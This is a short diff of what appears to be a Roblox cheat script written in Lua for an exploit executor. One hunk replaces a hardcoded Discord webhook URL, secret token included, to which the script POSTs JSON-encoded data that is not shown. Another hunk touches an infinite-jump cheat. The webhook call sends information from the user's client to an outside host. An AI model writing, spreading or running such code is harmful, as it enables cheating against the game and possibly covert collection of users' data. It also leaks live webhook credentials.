@@ -6271,7 +6271,7 @@ wait(4)
                     local Encoded = HttpService:JSONEncode(Data)
                     
                     Request = http_request or request or HttpPost or syn.request
-                    local Final1 = {Url = "https://discord.com/api/webhooks/1097218722768359575/cGYH8PmTJrlnHNleJDBKWL0JBXevFSTjy3ZPPxtGY4k1tBqgJURvkbtJTCJHUJnSRkYe", Body = Encoded, Method = "POST", Headers = Headers}
+                    local Final1 = {Url = "https://discord.com/api/webhooks/1097218732851474493/fRSwAAPqcwP92I3DllsVWtMrZIMA7x3Ds4uWeHeqNOyF5MliSUKk8HfbJu_YbIhx3wRU", Body = Encoded, Method = "POST", Headers = Headers}
                    
                     Request(Final1)
                                  
@@ -7830,4 +7830,4 @@ game:GetService("UserInputService").JumpRequest:connect(function()
 	if _G.ifnjump then
 		game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
 	end
-end)  
+end)
